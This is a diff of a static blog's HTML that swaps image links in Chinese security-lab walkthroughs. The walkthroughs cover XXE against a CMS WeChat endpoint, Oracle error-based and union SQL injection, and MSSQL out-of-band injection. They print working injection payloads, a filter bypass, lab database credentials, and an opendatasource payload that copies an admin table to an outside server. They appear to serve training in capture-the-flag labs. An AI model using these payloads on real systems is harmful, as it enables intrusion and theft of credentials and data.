@@ -249,14 +249,14 @@
 <h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>使用开发语言提供的禁用外部实体的方法</p>
 <p>过滤用户提交的XML数据</p>
 <p>关键词：SYSTEM和PUBLIC</p>
-<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>1、进入靶场，观察到是CMS搭建的<br><img src="https://img-blog.csdnimg.cn/20210407152722799.JPG" alt="在这里插入图片描述"></p>
+<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>1、进入靶场，观察到是CMS搭建的<br><img src="/Image%5CXXE--Chinese%5C20241017130950125.png" alt="在这里插入图片描述"></p>
 <p>2、下载与靶场相同的CMS，导入源码到seay，进行代码审计</p>
 <p>3、定位simplexml_load_string函数</p>
-<p>4、打开weixin文件夹下的idnex.php<br><img src="https://img-blog.csdnimg.cn/20210407152739849.JPG" alt="在这里插入图片描述"></p>
-<p>4、代码分析：<br><img src="https://img-blog.csdnimg.cn/20210407152809524.JPG" alt="在这里插入图片描述"></p>
+<p>4、打开weixin文件夹下的idnex.php<br><img src="/Image%5CXXE--Chinese%5C20241017130950132.png" alt="在这里插入图片描述"></p>
+<p>4、代码分析：<br><img src="/Image%5CXXE--Chinese%5C20241017130950135.png" alt="在这里插入图片描述"></p>
 <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">simplexml_load_string</span><span class="params">(<span class="variable">$postArr</span>)</span></span>==&gt;将变量postArr转换为对象</span><br><span class="line">&amp;postArr 是一个XML字符串</span><br><span class="line"><span class="variable">$postArr</span> = <span class="built_in">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>)</span><br><span class="line"><span class="function"><span class="title">file_get_contents</span><span class="params">()</span></span>==&gt;整个文件读入在一个字符串中</span><br><span class="line">php:<span class="comment">//input==&gt;PHP伪协议，只能在php内部使用；</span></span><br><span class="line">可以访问请求的原始数据的只读流</span><br></pre></td></tr></table></figure>
 
-<p>往上溯源<br><img src="https://img-blog.csdnimg.cn/20210407152845135.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>往上溯源<br><img src="/Image%5CXXE--Chinese%5C20241017130950147.png" alt="在这里插入图片描述"></p>
 <p>第一个if<br>if ($echostr !&#x3D; “”)&#x3D;&#x3D;&gt;如果echostr变量不等于空才会执行这个分支</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">要使得第二个if分支执行，那么echostr变量等于空</span><br></pre></td></tr></table></figure>
 
@@ -264,16 +264,16 @@
 <figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$signature = $_REQUEST[<span class="string">&quot;signature&quot;</span>]<span class="comment">;</span></span><br><span class="line">$echostr = $_REQUEST[<span class="string">&quot;echostr&quot;</span>]</span><br><span class="line"></span><br><span class="line">故可通过传参控制$signature和$echostr</span><br></pre></td></tr></table></figure>
 
 <p>5、观察发现该cms的敏感文件位于conn文件夹下的conn.php<br>该文件中存放了数据库的用户名、密码、数据库名<br>读取信息 payload：</p>
-<p>6、访问靶场下的weixin页面<br><img src="https://img-blog.csdnimg.cn/20210407152943336.png" alt="在这里插入图片描述"></p>
+<p>6、访问靶场下的weixin页面<br><img src="/Image%5CXXE--Chinese%5C20241017130951172.png" alt="在这里插入图片描述"></p>
 <p>7、抓包，传参<br>传参：?signature&#x3D;1&amp;echostr&#x3D;<br>写入数据：<br>?xml version&#x3D;”1.0”?&gt;</p>
-<p>%remote;<br>%send;<br>]&gt;<br><img src="https://img-blog.csdnimg.cn/20210407153219803.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>8、传参被检测<br>检测传参 一般只针对$_POST、$_GET、$_REQUEST、$_COOKIE<br>Content-Type:application&#x2F;x-www-form-urlencoded<br>类型为表单<br>因为是表单，所以才会被POST&#x2F;GET….接收，故删除Content-Type即可<br><img src="https://img-blog.csdnimg.cn/20210407153323676.png" alt="在这里插入图片描述"><br>发送成功</p>
+<p>%remote;<br>%send;<br>]&gt;<br><img src="/Image%5CXXE--Chinese%5C20241017130951182.png" alt="在这里插入图片描述"></p>
+<p>8、传参被检测<br>检测传参 一般只针对$_POST、$_GET、$_REQUEST、$_COOKIE<br>Content-Type:application&#x2F;x-www-form-urlencoded<br>类型为表单<br>因为是表单，所以才会被POST&#x2F;GET….接收，故删除Content-Type即可<br><img src="/Image%5CXXE--Chinese%5C20241017130951189.png" alt="在这里插入图片描述"><br>发送成功</p>
 <p>9、访问3.txt，获得信息，进行解码得到<br>$conn &#x3D; mysqli_connect(“192.168.0.10”,”xxe”, “teiwo!8#7ERe1DPC”, “scms”);<br>用户名：xxe<br>密码：teiwo!8#7ERe1DPC<br>数据库名：scms</p>
-<p>10、通过目录扫描知道有adminer.php，进行访问<br><img src="https://img-blog.csdnimg.cn/20210407153358922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>登录获取的账号密码数据库名<br><img src="https://img-blog.csdnimg.cn/20210407153416676.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>11、通过执行 select * from SL_admin<br>得到SL_admin表的所有信息<br><img src="https://img-blog.csdnimg.cn/20210407153432584.png" alt="在这里插入图片描述"></p>
-<p>12、通过提示信息得知flag为管理员的密码<br>故将admin的A_pwd字段进行md5解码<br><img src="https://img-blog.csdnimg.cn/20210407153444773.JPG" alt="在这里插入图片描述"></p>
-<p>13、通关<br><img src="https://img-blog.csdnimg.cn/20210407153454539.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>10、通过目录扫描知道有adminer.php，进行访问<br><img src="/Image%5CXXE--Chinese%5C20241017130951199.png" alt="在这里插入图片描述"></p>
+<p>登录获取的账号密码数据库名<br><img src="/Image%5CXXE--Chinese%5C20241017130952202.png" alt="在这里插入图片描述"></p>
+<p>11、通过执行 select * from SL_admin<br>得到SL_admin表的所有信息<br><img src="/Image%5CXXE--Chinese%5C20241017130952206.png" alt="在这里插入图片描述"></p>
+<p>12、通过提示信息得知flag为管理员的密码<br>故将admin的A_pwd字段进行md5解码<br><img src="/Image%5CXXE--Chinese%5C20241017130952210.png" alt="在这里插入图片描述"></p>
+<p>13、通关<br><img src="/Image%5CXXE--Chinese%5C20241017130952213.png" alt="在这里插入图片描述"></p>
 
       
     </div>
@@ -1028,83 +1028,83 @@
 <p>1、查出表名<br>构造payload:</p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=CTXSYS.DRITHSX.SN（<span class="number">1</span>,(<span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> (<span class="keyword">select</span> rownum num,<span class="built_in">table_name</span> <span class="keyword">from</span> user_tables) </span><br><span class="line"><span class="keyword">where</span> num=<span class="number">1</span>)）</span><br></pre></td></tr></table></figure>
 
-<p>分析：<br>从(select rownum num,table_name from user_tables) 里面查询字段table_name的值<br>select rownum num,table_name from user_tables<br>&#x3D;&#x3D;》查询user_tables表中的table_name字段,并将rownum取别名 num<br>当num&#x3D;1时，取出num等于1所在行的table_name值并返回给上层的table_name<br><img src="https://img-blog.csdnimg.cn/2021041017563360.png" alt="在这里插入图片描述"></p>
-<p>得出第一个表名NEWS<br><img src="https://img-blog.csdnimg.cn/20210410175542770.png" alt="在这里插入图片描述"></p>
-<p>将num&#x3D;1改为num&#x3D;2<br>得出第二张表名MD5<br><img src="https://img-blog.csdnimg.cn/20210410175559562.png" alt="在这里插入图片描述"></p>
-<p>将num&#x3D;2改为num&#x3D;3<br>得出第三张表名ADMIN<br><img src="https://img-blog.csdnimg.cn/2021041017560847.png" alt="在这里插入图片描述"></p>
-<p>将num&#x3D;3改为num&#x3D;4<br>没有信息<br><img src="https://img-blog.csdnimg.cn/20210410175702437.png" alt="在这里插入图片描述"></p>
+<p>分析：<br>从(select rownum num,table_name from user_tables) 里面查询字段table_name的值<br>select rownum num,table_name from user_tables<br>&#x3D;&#x3D;》查询user_tables表中的table_name字段,并将rownum取别名 num<br>当num&#x3D;1时，取出num等于1所在行的table_name值并返回给上层的table_name<br><img src="/Image%5CSQL-Oracle5-Chinese%5C2024101713003465.png" alt="在这里插入图片描述"></p>
+<p>得出第一个表名NEWS<br><img src="/Image%5CSQL-Oracle5-Chinese%5C2024101713003468.png" alt="在这里插入图片描述"></p>
+<p>将num&#x3D;1改为num&#x3D;2<br>得出第二张表名MD5<br><img src="/Image%5CSQL-Oracle5-Chinese%5C2024101713003472.png" alt="在这里插入图片描述"></p>
+<p>将num&#x3D;2改为num&#x3D;3<br>得出第三张表名ADMIN<br><img src="/Image%5CSQL-Oracle5-Chinese%5C2024101713003476.png" alt="在这里插入图片描述"></p>
+<p>将num&#x3D;3改为num&#x3D;4<br>没有信息<br><img src="/Image%5CSQL-Oracle5-Chinese%5C2024101713003480.png" alt="在这里插入图片描述"></p>
 <p>得出共三张表 ADMIN MD5 NEWS</p>
 <p>2、构造payload得出ADMIN表中的字段名</p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> <span class="built_in">table_name</span>=’<span class="keyword">ADMIN</span>’ <span class="keyword">and</span> rownum=<span class="number">1</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=CTXSYS.DRITHSX.SN（<span class="keyword">user</span>,(<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span></span><br><span class="line"> <span class="built_in">table_name</span>=’<span class="keyword">ADMIN</span>’ <span class="keyword">and</span> rownum=<span class="number">1</span>)）</span><br></pre></td></tr></table></figure>
 
-<p>查出第一个字段名UNAME<br><img src="https://img-blog.csdnimg.cn/20210410175825468.png" alt="在这里插入图片描述"></p>
+<p>查出第一个字段名UNAME<br><img src="/Image%5CSQL-Oracle5-Chinese%5C2024101713003593.png" alt="在这里插入图片描述"></p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=CTXSYS.DRITHSX.SN（<span class="keyword">user</span>,(<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> <span class="built_in">table_name</span>=’<span class="keyword">ADMIN</span>’ </span><br><span class="line"><span class="keyword">and</span> <span class="built_in">column_name</span> &lt;&gt;’UNAME’)</span><br></pre></td></tr></table></figure>
 
-<p>得出第二个字段名UPASS<br><img src="https://img-blog.csdnimg.cn/20210410175909250.png" alt="在这里插入图片描述"></p>
+<p>得出第二个字段名UPASS<br><img src="/Image%5CSQL-Oracle5-Chinese%5C20241017130035101.png" alt="在这里插入图片描述"></p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=CTXSYS.DRITHSX.SN（<span class="keyword">user</span>,(<span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> <span class="built_in">table_name</span>=’<span class="keyword">ADMIN</span>’ <span class="keyword">and</span> <span class="built_in">column_name</span> &lt;&gt;’UNAME’ <span class="keyword">and</span> <span class="built_in">column_name</span> &lt;&gt;’UPASS’)）</span><br></pre></td></tr></table></figure>
 
-<p>没有信息<br><img src="https://img-blog.csdnimg.cn/20210410175924842.png" alt="在这里插入图片描述"></p>
+<p>没有信息<br><img src="/Image%5CSQL-Oracle5-Chinese%5C20241017130035108.png" alt="在这里插入图片描述"></p>
 <p>ADMIN表共2个字段 UNAME UPASS</p>
 <p>3、构造payload，查出数据信息</p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=CTXSYS.DRITHSX.SN（<span class="keyword">user</span>,(<span class="keyword">select</span> uname <span class="keyword">from</span> (<span class="keyword">select</span> rownum num,uname,upass <span class="keyword">from</span> <span class="keyword">admin</span>) <span class="keyword">where</span> num=<span class="number">1</span>)）</span><br><span class="line">uanme的第一个值为OCI</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/2021041017594789.png" alt="在这里插入图片描述"></p>
+<p><img src="/Image%5CSQL-Oracle5-Chinese%5C20241017130035119.png" alt="在这里插入图片描述"></p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=CTXSYS.DRITHSX.SN（<span class="keyword">user</span>,(<span class="keyword">select</span> uname <span class="keyword">from</span> (<span class="keyword">select</span> rownum num,uname,upass <span class="keyword">from</span> <span class="keyword">admin</span>) <span class="keyword">where</span> num=<span class="number">2</span>)）</span><br><span class="line">uname的第二个值是NF</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/2021041018000350.png" alt="在这里插入图片描述"></p>
+<p><img src="/Image%5CSQL-Oracle5-Chinese%5C20241017130035126.png" alt="在这里插入图片描述"></p>
 <p>查出NF的upass字段信息</p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span>=CTXSYS.DRITHSX.SN（<span class="keyword">user</span>,(<span class="keyword">select</span> upass <span class="keyword">from</span> (<span class="keyword">select</span> rownum num,uname,upass <span class="keyword">from</span> <span class="keyword">admin</span>) <span class="keyword">where</span> num=<span class="number">2</span>)）</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/20210410180015188.png" alt="在这里插入图片描述"></p>
+<p><img src="/Image%5CSQL-Oracle5-Chinese%5C20241017130036134.png" alt="在这里插入图片描述"></p>
 <p>4、得到flag，通关</p>
-<h2 id="显错注入"><a href="#显错注入" class="headerlink" title="显错注入"></a>显错注入</h2><p>1、进入靶场<br><img src="https://img-blog.csdnimg.cn/20210410180121421.png" alt="在这里插入图片描述"></p>
-<p>2、使用and 1&#x3D;1，正常<br><img src="https://img-blog.csdnimg.cn/2021041018013394.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>3、使用and 1&#x3D;2，报错<br><img src="https://img-blog.csdnimg.cn/20210410180145812.png" alt="在这里插入图片描述"></p>
-<p>4、存在注入点，使用order by 判断字段数<br>order by 5 报错<br><img src="https://img-blog.csdnimg.cn/20210410180203205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>order by 4 正常<br><img src="https://img-blog.csdnimg.cn/20210410180215990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h2 id="显错注入"><a href="#显错注入" class="headerlink" title="显错注入"></a>显错注入</h2><p>1、进入靶场<br><img src="/Image%5CSQL-Oracle5-Chinese%5C20241017130036141.png" alt="在这里插入图片描述"></p>
+<p>2、使用and 1&#x3D;1，正常<br><img src="/Image%5CSQL-Oracle5-Chinese%5C20241017130036144.png" alt="在这里插入图片描述"></p>
+<p>3、使用and 1&#x3D;2，报错<br><img src="/Image%5CSQL-Oracle5-Chinese%5C20241017130036147.png" alt="在这里插入图片描述"></p>
+<p>4、存在注入点，使用order by 判断字段数<br>order by 5 报错<br><img src="/Image%5CSQL-Oracle5-Chinese%5C20241017130036151.png" alt="在这里插入图片描述"></p>
+<p>order by 4 正常<br><img src="/Image%5CSQL-Oracle5-Chinese%5C20241017130037154.png" alt="在这里插入图片描述"></p>
 <p>得出字段数为4</p>
-<p>5、使用联合查询 探测输出点<br>构造payload：-1 union select 1,2,3,4 报错<br><img src="https://img-blog.csdnimg.cn/20210410180247598.png" alt="在这里插入图片描述"></p>
-<p>6、不是MySQL数据库，试一试dual表呢<br>构造payload：-1 union select 1,2,3,4 from dual<br>还是报错<br><img src="https://img-blog.csdnimg.cn/20210410180303105.png" alt="在这里插入图片描述"></p>
+<p>5、使用联合查询 探测输出点<br>构造payload：-1 union select 1,2,3,4 报错<br><img src="/Image%5CSQL-Oracle5-Chinese%5C20241017130037160.png" alt="在这里插入图片描述"></p>
+<p>6、不是MySQL数据库，试一试dual表呢<br>构造payload：-1 union select 1,2,3,4 from dual<br>还是报错<br><img src="/Image%5CSQL-Oracle5-Chinese%5C20241017130037165.png" alt="在这里插入图片描述"></p>
 <p>7、会不会是数据类型呢？<br>构造payload：-1 union select null,null,null,null from dual<br>没有报错</p>
-<p><img src="https://img-blog.csdnimg.cn/20210410180313980.png" alt="在这里插入图片描述"></p>
-<p>8、探测4个字段数的数据类型<br>改第一个null为1<br>无变化，知第一个null为数字型<br><img src="https://img-blog.csdnimg.cn/202104101803266.png" alt="在这里插入图片描述"></p>
-<p>改第二个字段数null分别为1，‘a’ 都是报错<br><img src="https://img-blog.csdnimg.cn/20210410180338814.png" alt="在这里插入图片描述"></p>
-<p>第三个字段数与第二个相同，都是报错<br><img src="https://img-blog.csdnimg.cn/20210410180358596.png" alt="在这里插入图片描述"></p>
-<p>探测第四个字段数，改null为2<br>有变化<br><img src="https://img-blog.csdnimg.cn/20210410180412842.png" alt="在这里插入图片描述"></p>
-<p>会不会是一个时间戳类型的呢 将2改为当前的时间戳填入<br><img src="https://img-blog.csdnimg.cn/20210410180429904.png" alt="在这里插入图片描述"></p>
+<p><img src="/Image%5CSQL-Oracle5-Chinese%5C20241017130037171.png" alt="在这里插入图片描述"></p>
+<p>8、探测4个字段数的数据类型<br>改第一个null为1<br>无变化，知第一个null为数字型<br><img src="/Image%5CSQL-Oracle5-Chinese%5C20241017130038176.png" alt="在这里插入图片描述"></p>
+<p>改第二个字段数null分别为1，‘a’ 都是报错<br><img src="/Image%5CSQL-Oracle5-Chinese%5C20241017130038179.png" alt="在这里插入图片描述"></p>
+<p>第三个字段数与第二个相同，都是报错<br><img src="/Image%5CSQL-Oracle5-Chinese%5C20241017130038182.png" alt="在这里插入图片描述"></p>
+<p>探测第四个字段数，改null为2<br>有变化<br><img src="/Image%5CSQL-Oracle5-Chinese%5C20241017130038186.png" alt="在这里插入图片描述"></p>
+<p>会不会是一个时间戳类型的呢 将2改为当前的时间戳填入<br><img src="/Image%5CSQL-Oracle5-Chinese%5C20241017130038189.png" alt="在这里插入图片描述"></p>
 <p>确认第一个为数字型，第四个为时间戳，第二、三个不知</p>
-<p>9、试一试to_nchar()<br>to_nchar()将varchar2转为nvarchar2<br>有回显<br><img src="https://img-blog.csdnimg.cn/20210410180455546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>9、试一试to_nchar()<br>to_nchar()将varchar2转为nvarchar2<br>有回显<br><img src="/Image%5CSQL-Oracle5-Chinese%5C20241017130039196.png" alt="在这里插入图片描述"></p>
 <p>10、构造payload查出表名</p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">table_name</span> <span class="keyword">from</span> user_tables</span><br><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, to_nchar(<span class="built_in">table_name</span>),<span class="keyword">null</span>,<span class="number">2</span> <span class="keyword">from</span> user_tables</span><br></pre></td></tr></table></figure>
 
-<p>查出一个表名 ADMIN<br><img src="https://img-blog.csdnimg.cn/2021041018053825.png" alt="在这里插入图片描述"></p>
+<p>查出一个表名 ADMIN<br><img src="/Image%5CSQL-Oracle5-Chinese%5C20241017130039206.png" alt="在这里插入图片描述"></p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, to_nchar(<span class="built_in">table_name</span>),<span class="keyword">null</span>,<span class="number">2</span> <span class="keyword">from</span> user_tables <span class="keyword">where</span> <span class="built_in">table_name</span> &lt;&gt; ‘<span class="keyword">ADMIN</span>’</span><br></pre></td></tr></table></figure>
 
-<p>查出第二个表名 MD5<br><img src="https://img-blog.csdnimg.cn/20210410180600650.png" alt="在这里插入图片描述"></p>
+<p>查出第二个表名 MD5<br><img src="/Image%5CSQL-Oracle5-Chinese%5C20241017130039213.png" alt="在这里插入图片描述"></p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, to_nchar(<span class="built_in">table_name</span>),<span class="keyword">null</span>,<span class="number">2</span> <span class="keyword">from</span> user_tables <span class="keyword">where</span> <span class="built_in">table_name</span> &lt;&gt; ‘<span class="keyword">ADMIN</span>’ <span class="keyword">and</span> </span><br><span class="line"><span class="built_in">table_name</span> &lt;&gt; ‘MD5’</span><br></pre></td></tr></table></figure>
 
-<p>查出第三个表名 NEWS<br><img src="https://img-blog.csdnimg.cn/20210410180632698.png" alt="在这里插入图片描述"></p>
+<p>查出第三个表名 NEWS<br><img src="/Image%5CSQL-Oracle5-Chinese%5C20241017130039221.png" alt="在这里插入图片描述"></p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, to_nchar(<span class="built_in">table_name</span>),<span class="keyword">null</span>,<span class="number">2</span> <span class="keyword">from</span> user_tables <span class="keyword">where</span> <span class="built_in">table_name</span> &lt;&gt; ‘<span class="keyword">ADMIN</span>’ </span><br><span class="line"><span class="keyword">and</span> <span class="built_in">table_name</span> &lt;&gt; ‘MD5’ <span class="keyword">and</span> <span class="built_in">table_name</span> &lt;&gt;’NEWS’</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/20210410180721607.png" alt="在这里插入图片描述"></p>
+<p><img src="/Image%5CSQL-Oracle5-Chinese%5C20241017130040228.png" alt="在这里插入图片描述"></p>
 <p>共三个表名：ADMIN MD5 NEWS</p>
 <p>11、flag可能在admin表中，查出admin表的字段名<br>构造payload：</p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">column_name</span> <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> <span class="built_in">table_name</span>=’<span class="keyword">ADMIN</span>’</span><br><span class="line">id=<span class="number">1.2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,to_nchar(<span class="built_in">column_name</span>),<span class="keyword">null</span>,<span class="number">2</span> <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> <span class="built_in">table_name</span>=’<span class="keyword">ADMIN</span>’</span><br></pre></td></tr></table></figure>
 
-<p>得到第一个字段名 UNAME<br><img src="https://img-blog.csdnimg.cn/20210410180815231.png" alt="在这里插入图片描述"></p>
+<p>得到第一个字段名 UNAME<br><img src="/Image%5CSQL-Oracle5-Chinese%5C20241017130040241.png" alt="在这里插入图片描述"></p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,to_nchar(<span class="built_in">column_name</span>),<span class="keyword">null</span>,<span class="number">2</span> <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> <span class="built_in">table_name</span>=’<span class="keyword">ADMIN</span>’ </span><br><span class="line"><span class="keyword">and</span> <span class="built_in">column_name</span> &lt;&gt; ‘UNAME’</span><br></pre></td></tr></table></figure>
 
-<p>得到第二个字段名 UPASS<br><img src="https://img-blog.csdnimg.cn/20210410180831815.png" alt="在这里插入图片描述"></p>
+<p>得到第二个字段名 UPASS<br><img src="/Image%5CSQL-Oracle5-Chinese%5C20241017130040249.png" alt="在这里插入图片描述"></p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1.2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,to_nchar(<span class="built_in">column_name</span>),<span class="keyword">null</span>,<span class="number">2</span> <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> <span class="built_in">table_name</span>=’<span class="keyword">ADMIN</span>’  </span><br><span class="line"><span class="keyword">and</span> <span class="built_in">column_name</span> &lt;&gt; ‘UNAME’ <span class="keyword">and</span> <span class="built_in">column_name</span> &lt;&gt; ‘UPASS’</span><br></pre></td></tr></table></figure>
 
-<p>没有找到对应的数据<br><img src="https://img-blog.csdnimg.cn/20210410180850196.png" alt="在这里插入图片描述"></p>
+<p>没有找到对应的数据<br><img src="/Image%5CSQL-Oracle5-Chinese%5C20241017130040257.png" alt="在这里插入图片描述"></p>
 <p>得出admin表中有2个字段，uname 和 upass<br>12、得到字段中的数据</p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> uname,upass <span class="keyword">from</span> <span class="keyword">admin</span></span><br></pre></td></tr></table></figure>
 
 <p>构造payload：</p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1.2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,to_nchar(UNAME),to_nchar(UPASS),<span class="keyword">null</span> <span class="keyword">from</span> <span class="keyword">ADMIN</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/20210410180920338.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="/Image%5CSQL-Oracle5-Chinese%5C20241017130040272.png" alt="在这里插入图片描述"></p>
 <p>13、得到flag，通关</p>
 
       
@@ -1229,22 +1229,22 @@
 <li>根据查到的表名字段名 创建表和字段名</li>
 <li>构造payload得到结果<br><code>&#39;;insert into opendatasource(&#39;sqloledb&#39;,&#39;server=SQL5095.site4now.net,1433;uid=DB_14DBE69_zkaq_admin;pwd=123456789;database=DB_14DBE69_zkaq&#39;).DB_14DBE69_zkaq.dbo.res select id,username,passwd,token from admin -- q</code></li>
 </ul>
-<h2 id="靶场（反弹注入）"><a href="#靶场（反弹注入）" class="headerlink" title="靶场（反弹注入）"></a>靶场（反弹注入）</h2><p>1、创建数据表tb，将查询到的id，name存放在该表中<br><img src="https://img-blog.csdnimg.cn/20210410173024557.png" alt="在这里插入图片描述"></p>
+<h2 id="靶场（反弹注入）"><a href="#靶场（反弹注入）" class="headerlink" title="靶场（反弹注入）"></a>靶场（反弹注入）</h2><p>1、创建数据表tb，将查询到的id，name存放在该表中<br><img src="/Image%5CSQL-9-Chinese%5C2024101713005075.png" alt="在这里插入图片描述"></p>
 <p>2、构造payload， 查询表名</p>
